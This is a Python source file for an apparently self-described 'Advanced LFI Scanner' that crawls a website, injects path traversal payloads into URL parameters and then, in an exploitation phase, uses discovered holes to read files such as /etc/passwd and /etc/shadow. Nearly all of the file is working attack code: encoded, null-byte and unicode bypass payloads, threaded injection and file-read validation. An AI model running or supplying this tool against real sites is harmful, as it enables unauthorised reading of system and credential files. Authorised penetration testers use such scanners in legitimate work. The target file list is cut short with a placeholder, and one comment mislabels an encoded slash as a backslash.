import argparse
import requests
import urllib3
import json
import csv
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Disable SSL/TLS warnings for easier debugging
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class LFIScanner:
    def __init__(self, proxy=None, threads=10):
        """Initialize scanner with configuration
        - proxy: Set up proxy for traffic inspection
        - threads: Control parallel request count
        - payloads: List of path traversal test patterns
        - vulnerabilities: Store found vulnerabilities
        - exploit_files: Target files for post-discovery exploitation"""
        self.session = self._create_session(proxy)
        self.tested_combinations = set()
        self.visited_urls = set()
        self.payloads = self._generate_payloads()
        self.vulnerabilities = []
        self.base_domain = None
        self.threads = threads
        self.executor = ThreadPoolExecutor(max_workers=threads)
        self.exploitation_results = []
        self.exploit_files = [  # Target files for exploitation phase
            '/etc/passwd', '/etc/shadow', '/etc/hosts', # ... full list
        ]

    def _create_session(self, proxy):
        """Configure HTTP session with retries and headers
        - Sets up connection pooling and retry logic
        - Adds browser-like User-Agent header
        - Configures proxy if provided"""
        session = requests.Session()
        session.verify = False  # Disable SSL verification
        # Configure automatic retries for failed requests
        retries = Retry(total=3, backoff_factor=1,
                       status_forcelist=[500, 502, 503, 504])
        session.mount('https://', HTTPAdapter(max_retries=retries))
        session.mount('http://', HTTPAdapter(max_retries=retries))
        # Set headers to mimic regular browser traffic
        session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept-Language': 'en-US,en;q=0.5'
        }
        if proxy:  # Proxy configuration
            if not proxy.startswith(('http://', 'https://')):
                proxy = f'http://{proxy}'
            session.proxies = {'http': proxy, 'https': proxy}
        return session

    def _generate_payloads(self):
        """Create path traversal payload variations
        - Includes different encoding styles
        - Null byte termination for extension bypass
        - Windows/Unix path variations
        - Double encoding and unicode bypass attempts"""
        base_paths = [
            # Basic directory traversal patterns
            '/etc/passwd', '../etc/passwd', '../../etc/passwd',
            # Encoded payload variations
            '%2e%2e%2f' * 8 + 'etc/passwd',
            # Windows path variations
            '..\\..\\..\\..\\windows\\win.ini'.replace('\\', quote('\\')),
            # File extension bypass
            '../../../etc/passwd%00.png',
        ]
        # Generate encoded versions of all base payloads
        encoded_paths = [quote(payload, safe='') for payload in base_paths]
        # Add unicode-based bypass attempts
        unicode_paths = [
            '..%c0%af..%c0%af..%c0%afetc/passwd',  # URL-encoded backslash
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd'  # Fullwidth slash
        ]
        return list(set(base_paths + encoded_paths + unicode_paths))

    def scan(self, start_url):
        """Main scanning workflow controller
        1. Set base domain for same-domain crawling
        2. Start URL crawling and parameter discovery
        3. Launch exploitation phase after initial scan"""
        self.base_domain = urlparse(start_url).netloc
        self._crawl(start_url)
        self._exploit_vulnerabilities()
        return self.vulnerabilities + self.exploitation_results

    def _exploit_vulnerabilities(self):
        """Post-discovery exploitation phase
        - Uses found vulnerabilities to test additional files
        - Threaded execution for speed
        - Tests each vulnerable parameter against all target files"""
        if not self.vulnerabilities:
            return
            
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            # Generate exploitation tests for each found vulnerability
            for vuln in self.vulnerabilities:
                for target_file in self.exploit_files:
                    futures.append(executor.submit(
                        self._test_exploit,
                        vuln['url'], vuln['parameter'], 
                        vuln['payload'], target_file
                    ))
            # Process results as they complete
            for future in as_completed(futures):
                if result := future.result():
                    self.exploitation_results.append(result)

    def _test_exploit(self, original_url, param, base_payload, target_file):
        """Test specific file exploitation
        - Generates modified payload for target file
        - Sends crafted request
        - Validates successful file read"""
        try:
            exploit_payload = self._generate_exploit_payload(base_payload, target_file)
            # Build test URL with modified payload
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            query[param] = [exploit_payload]
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in query.items()]
            )).geturl()

            response = self.session.get(test_url, timeout=15)
            if self._is_valid_exploitation(response):
                return {
                    'type': 'exploitation',
                    'url': test_url,
                    'parameter': param,
                    'target_file': target_file,
                    'payload': exploit_payload,
                    'content': response.text[:500] + '...' if response.text else '',
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }
        except Exception as e:
            print(f"[-] Exploit failed: {str(e)}")
        return None

    def _generate_exploit_payload(self, base_payload, target_file):
        """Adapt successful payload for new targets
        - Preserves original traversal pattern
        - Replaces target filename/path
        - Maintains encoding style from original payload"""
        decoded_payload = unquote(base_payload)
        # Extract base traversal pattern
        if '/etc/passwd' in decoded_payload:
            base_pattern = decoded_payload.split('/etc/passwd')[0]
        else:
            # Fallback pattern extraction
            match = re.search(r'(.*?)(?:[\/\\]?[\w\.\-]+)$', decoded_payload)
            base_pattern = match.group(1) if match else decoded_payload
        # Clean null bytes and reconstruct payload
        base_pattern = base_pattern.replace('%00', '').replace('\x00', '')
        encoded_pattern = base_payload.replace(decoded_payload, base_pattern)
        return encoded_pattern + quote(target_file)

    def _extract_target_file(self, base_payload):
        """Identify reusable traversal pattern
        - Finds common vulnerable file patterns
        - Extracts preceding traversal sequence
        - Handles different encoding formats"""
        decoded = unquote(base_payload)
        # Try common vulnerable file patterns
        for pattern in ['/etc/passwd', 'win.ini']:
            if pattern in decoded:
                return base_payload.replace(decoded, decoded.split(pattern)[0])
        # Fallback to regex extraction
        return re.sub(r'[^\/\\]*$', '', base_payload)

    def _is_valid_exploitation(self, response):
        """Validate successful file read
        - Checks HTTP status code
        - Looks for error messages in content
        - Verifies meaningful content length"""
        if response.status_code != 200:
            return False
        content = response.text.lower()
        # Common error messages to ignore
        error_indicators = ['file not found', 'permission denied']
        return not any(err in content for err in error_indicators) and bool(content)

    # Continued below with crawling and detection methods...

    def _crawl(self, url):
        """Website crawling system
        1. Maintains list of visited URLs to prevent duplicates
        2. Extracts links from page content
        3. Processes found URLs recursively
        4. Analyzes parameters on each page
        - Uses BFS algorithm with limited depth
        - Handles relative/absolute URL conversion
        - Respects same-domain restriction"""
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)

        try:
            # Fetch page content with error handling
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all link-bearing elements in HTML
            elements = soup.find_all(['a', 'form', 'link', 'script', 'img'])
            futures = []
            
            # Process each discovered element
            for element in elements:
                new_url = self._extract_url(element, url)
                if new_url and new_url not in self.visited_urls:
                    # Submit URL processing to thread pool
                    futures.append(self.executor.submit(self._process_url, new_url))

            # Immediate parameter analysis for current page
            self._analyze_parameters(url)
            
            # Process child URLs as they complete
            for future in as_completed(futures):
                future.result()

        except Exception as e:
            print(f"[-] Crawling error: {str(e)}")

    def _extract_url(self, element, base_url):
        """URL extraction and normalization
        1. Handles different HTML element types
        2. Converts relative URLs to absolute
        3. Validates same-domain restriction
        4. Cleans URL fragments and trailing slashes
        - Supports: <a>, <form>, <link>, <script>, <img>"""
        element_types = {
            'a': 'href', 'form': 'action', 
            'link': 'href', 'script': 'src', 
            'img': 'src'
        }
        attr = element_types.get(element.name)
        if not attr:
            return None

        url = element.get(attr)
        if url:
            # Convert to absolute URL and clean
            absolute_url = urljoin(base_url, url).split('#')[0]
            parsed = urlparse(absolute_url)
            
            # Enforce same-domain policy
            if parsed.netloc == self.base_domain:
                return parsed._replace(
                    path=parsed.path.rstrip('/'),  # Standardize path
                    query=parsed.query.strip()      # Clean query params
                ).geturl()
        return None

    def _process_url(self, url):
        """URL processing pipeline
        1. Parameter analysis for vulnerability testing
        2. Recursive crawling continuation
        - Ensures systematic site exploration
        - Maintains thread-safe URL tracking"""
        self._analyze_parameters(url)
        self._crawl(url)

    def _analyze_parameters(self, url):
        """Parameter discovery and testing
        1. Parse URL query parameters
        2. Generate payload tests for each parameter
        3. Threaded execution of vulnerability checks
        - Prevents duplicate tests using combination tracking
        - Handles multiple parameters per URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params:
            futures = []
            for payload in self.payloads:
                # Unique test identifier
                combination = (parsed.path, param, payload)
                if combination not in self.tested_combinations:
                    self.tested_combinations.add(combination)
                    # Submit parameter test to thread pool
                    futures.append(self.executor.submit(
                        self._test_parameter, url, param, payload
                    ))
            
            # Collect results as they complete
            for future in as_completed(futures):
                if result := future.result():
                    self.vulnerabilities.append(result)

    def _test_parameter(self, original_url, param, payload):
        """Individual parameter test execution
        1. Builds test URL with injected payload
        2. Sends crafted request
        3. Analyzes response for vulnerability signs
        - Handles network errors gracefully
        - Returns structured vulnerability data"""
        try:
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            
            # Preserve original URL structure
            test_params = parse_qs(parsed.query)
            test_params[param] = [payload]
            
            # Construct test URL
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in test_params.items()]
            )).geturl()

            response = self.session.get(test_url, timeout=15)
            
            if self._is_vulnerable(response):
                return {
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'os': self._detect_os(response),
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }

        except Exception as e:
            print(f"[-] Test failed: {str(e)}")
        return None

    def _is_vulnerable(self, response):
        """Vulnerability detection logic
        1. Checks HTTP status codes
        2. Looks for OS-specific content patterns
        3. Analyzes response length anomalies
        - Combines multiple detection methods
        - Reduces false positives through pattern matching"""
        content = response.text.lower()
        indicators = {
            'unix': ['root:x:', 'bin:x:', 'daemon:x:'],
            'windows': ['[boot loader]', '[extensions]'],
            'php': ['<?php', '<?='],
            'generic': ['file not found', 'permission denied']
        }
    
        # Status code filtering
        if response.status_code not in [200, 500]:
            return False

        # Content pattern matching
        for os_type, patterns in indicators.items():
            if any(p in content for p in patterns):
                return True

        # Response length heuristic
        if len(response.text) > 1000 and \
           'html' not in response.headers.get('content-type', ''):
            return True

        return False

    def _detect_os(self, response):
        """Operating system detection
        - Uses content patterns from vulnerable responses
        - Helps guide subsequent exploitation attempts
        - Supports Windows/Unix identification"""
        content = response.text.lower()
        if any(p in content for p in ['root:x:', 'bin:x:']):
            return 'unix'
        elif any(p in content for p in ['[boot loader]', '[extensions]']):
            return 'windows'
        return 'unknown'

    def _get_baseline(self, url):
        """Baseline response analysis
        - Captures normal response characteristics
        - Future use for anomaly detection
        - Currently not fully implemented"""
        try:
            response = self.session.get(url, timeout=10)
            return {
                'status': response.status_code,
                'length': len(response.text),
                'content_type': response.headers.get('content-type', '')
            }
        except Exception as e:
            print(f"[-] Baseline error: {str(e)}")
            return None
        
def main():
    """Command-line interface and main execution flow
    1. Parse command-line arguments
    2. Initialize scanner with user configuration
    3. Execute scanning process
    4. Generate output reports
    5. Handle errors and display results"""
    
    # Configure command-line argument parser
    parser = argparse.ArgumentParser(
        description="Advanced LFI Scanner - Detect and exploit path traversal vulnerabilities",
        epilog="Example: %(prog)s -u https://example.com -p 127.0.0.1:8080 -t 20 -o json"
    )
    
    # Define supported command-line arguments
    parser.add_argument("-u", "--url", required=True,
                      help="Target URL to scan (e.g., https://vulnerable-site.com)")
    parser.add_argument("-p", "--proxy", 
                      help="Proxy server for traffic inspection (e.g., Burp Suite: 127.0.0.1:8080)")
    parser.add_argument("-o", "--output", choices=['json', 'csv'], 
                      help="Generate report in specified format (JSON/CSV)")
    parser.add_argument("-t", "--threads", type=int, default=10,
                      help="Concurrent threads for scanning (default: 10, max recommended: 50)")

    # Parse user input
    args = parser.parse_args()
    
    # Initialize scanner with user configuration
    scanner = LFIScanner(
        proxy=args.proxy, 
        threads=args.threads
    )
    
    print(f"[*] Starting scan on {args.url} with {args.threads} threads")
    
    try:
        # Execute full scanning process
        vulnerabilities = scanner.scan(args.url)
        
        # Report generation logic
        if args.output:
            if args.output.lower() == 'json':
                # Generate JSON report with pretty printing
                with open('report.json', 'w') as f:
                    json.dump(vulnerabilities, f, indent=2, ensure_ascii=False)
                print("[*] JSON report generated: report.json")
                
            elif args.output.lower() == 'csv':
                # Generate CSV report with standard columns
                with open('report.csv', 'w', newline='') as f:
                    writer = csv.writer(f)
                    # Write header row
                    writer.writerow([
                        'URL', 'Parameter', 'Payload', 
                        'Status', 'Length', 'Timestamp'
                    ])
                    # Write vulnerability data
                    for vuln in vulnerabilities:
                        writer.writerow([
                            vuln['url'],
                            vuln['parameter'],
                            vuln['payload'],
                            vuln['status'],
                            vuln['length'],
                            vuln['timestamp']
                        ])
                print("[*] CSV report generated: report.csv")
        
        # Final status output
        print(f"[*] Scan complete. Found {len(vulnerabilities)} vulnerabilities.")
    
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        # Handle unexpected errors gracefully
        print(f"[!] Critical error: {str(e)}")
        print("[!] Consider reducing thread count or checking network connection")


if __name__ == "__main__":
    """Script entry point protection
    - Ensures code only runs when executed directly
    - Prevents accidental execution when imported
    - Handles top-level exception catching"""
    main()